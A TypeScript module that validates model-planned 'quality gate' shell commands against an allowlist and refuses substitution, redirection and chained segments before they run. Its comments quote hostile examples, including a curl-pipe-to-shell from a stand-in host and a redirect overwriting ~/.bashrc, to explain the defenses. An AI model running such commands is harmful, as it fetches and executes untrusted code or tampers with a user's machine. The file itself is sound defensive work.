/**
 * What a planned quality gate is allowed to be (030-execution-trust).
 *
 * Quality gates are the one place in this system where a model's output becomes a command on the
 * user's machine with nothing in between: the planner writes strings into a task's
 * `## Quality Gates to Run` block, and the runtime hands each one to `spawnSync(command,
 * { shell: true })` in the repository root.
 *
 * The check is deliberately **over-strict**. A gate this module refuses wrongly costs one line in
 * CONFIG.md and says exactly why; a gate it permits wrongly costs whatever that command does. Where
 * the two error directions are that asymmetric, the conservative one is not a close call.
 */

/** A gate command, and the specific reason it was not allowed to run. */
export interface GateCommandRejection {
  readonly command: string;
  readonly segment: string;
  readonly reason: string;
}

/**
 * Constructs that let a command mean something other than what it reads as.
 *
 * A prefix allowlist is decorative without this: `npm test` passes any prefix check, and
 * `npm test $(curl -s evil.sh | sh)` passes the same one. These are refused outright rather than
 * inspected, because deciding what a substitution expands to is exactly the analysis a static check
 * cannot do.
 */
const SUBSTITUTION_PATTERNS: readonly { readonly token: string; readonly reason: string }[] = [
  { token: '$(', reason: 'command substitution' },
  { token: '`', reason: 'backtick command substitution' },
  { token: '<(', reason: 'process substitution' },
  { token: '>(', reason: 'process substitution' },
];

/**
 * Splits a shell string into the commands it would actually run, quote-aware.
 *
 * Quote-aware because the naive version refuses `npm test -- --grep "a|b"`, and a check that cries
 * wolf on legitimate gates gets switched off. Anything genuinely unparseable -- an unterminated
 * quote -- is reported rather than guessed at.
 */
export function splitShellSegments(command: string): { readonly segments: readonly string[]; readonly unbalanced: boolean } {
  const segments: string[] = [];
  let current = '';
  let quote: "'" | '"' | null = null;

  for (let index = 0; index < command.length; index += 1) {
    const character = command[index] as string;

    if (quote) {
      current += character;
      if (character === quote && command[index - 1] !== '\\') {
        quote = null;
      }
      continue;
    }

    if (character === "'" || character === '"') {
      quote = character;
      current += character;
      continue;
    }

    const pair = command.slice(index, index + 2);
    if (pair === '&&' || pair === '||') {
      segments.push(current);
      current = '';
      index += 1;
      continue;
    }

    if (character === ';' || character === '|' || character === '&' || character === '\n') {
      segments.push(current);
      current = '';
      continue;
    }

    current += character;
  }

  segments.push(current);

  return {
    segments: segments.map((segment) => segment.trim()).filter((segment) => segment.length > 0),
    unbalanced: quote !== null,
  };
}

/**
 * Whether one already-split segment starts with an allowed prefix.
 *
 * The trailing-space requirement is what stops `npm run` from admitting `npm runsomethingelse`:
 * a prefix has to end at a word boundary to be a prefix of a command rather than of a string.
 */
function isSegmentAllowed(segment: string, allowlist: readonly string[]): boolean {
  const normalized = segment.replace(/\s+/g, ' ').trim();
  return allowlist.some((entry) => {
    const prefix = entry.replace(/\s+/g, ' ').trim();
    return prefix.length > 0 && (normalized === prefix || normalized.startsWith(`${prefix} `));
  });
}

/** Every reason the given gate commands would not be allowed to run, in order. */
export function findGateCommandRejections(
  commands: readonly string[],
  allowlist: readonly string[],
): readonly GateCommandRejection[] {
  const rejections: GateCommandRejection[] = [];

  for (const command of commands) {
    const trimmed = command.trim();
    if (trimmed.length === 0) {
      continue;
    }

    // Redirection is refused before splitting: `npm test > ~/.bashrc` has one segment, and that
    // segment starts with an allowed prefix. What makes it dangerous is not the command.
    if (/(^|[^0-9<>])>>?[^&]/.test(trimmed) || trimmed.includes('>&')) {
      rejections.push({ command, segment: trimmed, reason: 'output redirection' });
      continue;
    }

    const { segments, unbalanced } = splitShellSegments(trimmed);
    if (unbalanced) {
      rejections.push({ command, segment: trimmed, reason: 'unterminated quote' });
      continue;
    }

    for (const segment of segments) {
      const substitution = SUBSTITUTION_PATTERNS.find((pattern) => segment.includes(pattern.token));
      if (substitution) {
        rejections.push({ command, segment, reason: substitution.reason });
        continue;
      }

      if (!isSegmentAllowed(segment, allowlist)) {
        rejections.push({ command, segment, reason: 'no allowed prefix matches it' });
      }
    }
  }

  return rejections;
}

/**
 * Refuses a set of planned gates, naming what to add to CONFIG.md if the refusal is wrong.
 *
 * The message carries the allowlist because the alternative -- "not allowed" with no statement of
 * what is -- turns a bounded system into a guessing game, which is the failure this project exists
 * to avoid.
 */
export function assertGateCommandsAllowed(
  commands: readonly string[],
  allowlist: readonly string[],
  taskLabel: string,
): void {
  const rejections = findGateCommandRejections(commands, allowlist);
  if (rejections.length === 0) {
    return;
  }

  throw new Error(
    `Planned ${taskLabel} quality_gates include commands this project has not permitted:\n`
    + rejections.map((rejection) => `  - "${rejection.segment}" (${rejection.reason})`).join('\n')
    + `\n\nQuality gates run as shell commands in the repository root, so they are checked against `
    + `execution_trust.gate_command_allowlist in CONFIG.md, which currently permits: `
    + `${allowlist.map((entry) => `"${entry}"`).join(', ')}. `
    + `Either plan a gate that uses one of those, or declare the new prefix in CONFIG.md.`,
  );
}
